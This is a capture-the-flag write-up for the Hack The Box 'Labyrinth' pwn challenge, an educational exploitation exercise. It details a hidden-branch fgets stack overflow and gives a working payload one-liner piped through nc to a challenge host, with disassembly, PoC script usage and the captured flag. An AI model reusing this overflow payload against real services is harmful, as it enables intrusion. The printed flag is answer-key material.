# Labyrinth (Hack The Box) - Professional PoC Writeup

## Challenge Profile

| Field | Value |
|---|---|
| Challenge | Labyrinth |
| Category | Pwn |
| Difficulty | Easy |
| Primary dropped file | `pwn_labyrinth (1).zip` |
| Existing local PoC before this update | Present |
| Core bug class | Hidden-path stack overflow via oversized `fgets` |

## Scope And Ethics

This material is for authorized CTF infrastructure only. Do not run this PoC
against systems you do not own or have explicit permission to test.

## Technical Summary

The program pretends to be a door-choice game. Selecting door `69` (or `069`)
opens a hidden branch where it calls:

```c
fgets(buffer, 0x44, stdin);
```

The destination buffer is only `0x30` bytes on stack, so this overflows saved
frame data.

A reliable exploit is:
1. Send `69` to unlock hidden branch.
2. Overflow with `48` bytes to fill buffer.
3. Overwrite saved `rbp` with writable address (`0x404150`).
4. Overwrite saved `rip` with `0x401287` (mid-function inside `escape_plan`).

Jumping to `0x401287` skips the prologue art and lands at the section that
prints success text, opens `./flag.txt`, and streams flag bytes.

## Vulnerable Behavior

1. Secret input branch (`69`) exposes unsafe second-stage input path.
2. `fgets(..., 0x44, ...)` exceeds real local buffer size (`0x30`).
3. Saved frame pointer and return address become attacker-controlled.
4. Existing flag-reading routine can be re-used without full ROP chain.

## Manual Verification Steps

1. Confirm symbol addresses:

```bash
nm -n challenge/labyrinth | egrep 'escape_plan|read_num| main$'
```

Expected key symbols:

```text
0000000000401255 T escape_plan
0000000000401325 T read_num
0000000000401405 T main
```

2. Verify hidden branch and overflow sink in `main`:

```bash
objdump -d -Mintel challenge/labyrinth | sed -n '280,560p'
```

Relevant instructions:

```text
40157d: call strncmp@plt       ; compare against "69"
401599: call strncmp@plt       ; compare against "069"
4015cd: mov esi,0x44
4015d5: call fgets@plt         ; writes into rbp-0x30 buffer
```

3. Verify mid-function win target in `escape_plan`:

```bash
objdump -d -Mintel challenge/labyrinth | sed -n '200,280p'
```

Relevant location:

```text
401287: ... inside escape_plan ...
4012c1: call open@plt          ; opens ./flag.txt
40130e: call read@plt          ; byte-by-byte read loop
```

4. Trigger manually:

```bash
(echo 69; python3 - <<'PY'
import struct
print((b'A'*48 + struct.pack('<Q',0x404150) + struct.pack('<Q',0x401287)).decode('latin1'), end='')
PY
) | nc 154.57.164.83 32444
```

5. Confirm output contains `HTB{...}`.

## Automated PoC

Script:
`labyrinth_poc.sh`

### Usage

```bash
cd "/home/eliah/Desktop/CTF/HackTheBox/Labyrinth"
chmod +x labyrinth_poc.sh
./labyrinth_poc.sh <host> <port>
```

### Common examples

```bash
./labyrinth_poc.sh 154.57.164.83 32444
./labyrinth_poc.sh --host 154.57.164.83 --port 32444 --verbose
./labyrinth_poc.sh --host 154.57.164.83 --port 32444 --json
```

## Options

- `--host <host>`: target host or IP.
- `--port <port>`: target TCP port.
- `--timeout <seconds>`: socket timeout, default `8`.
- `--stage-delay <seconds>`: delay between protocol stages, default `0.30`.
- `--fake-rbp <hex>`: overwritten saved RBP, default `0x404150`.
- `--ret <hex>`: overwritten return address, default `0x401287`.
- `--json`: machine-readable JSON output.
- `--verbose`: print debug output.
- `-h`, `--help`: show usage help.

## Exit Codes

- `0`: exploit succeeded and flag extracted.
- `2`: invalid CLI arguments.
- `3`: connectivity/protocol failure.
- `4`: exploit sent but flag not found.

## Why The Exploit Works

- Hidden `69` path reaches vulnerable `fgets` call with oversized length.
- Overflow reaches saved `rbp`/`rip` after 48-byte local buffer.
- Mid-function jump reuses trusted flag-reading logic.
- Controlled `rbp` prevents crash when `escape_plan` uses stack locals.

## Defensive Guidance

- Never pass a read length larger than destination buffer size.
- Remove secret/debug paths from production builds.
- Compile with hardening (stack canaries, PIE, RELRO, FORTIFY where possible).
- Prefer explicit bounds-checked input parsing and centralized validation.

## Result Note

Flag values are instance-specific. The format remains `HTB{...}`.

## Final Flag

Target instance: `154.57.164.83:32444`  
Solved on: `2026-04-02`  
Flag: `HTB{3sc4p3_fr0m_4b0v3}`
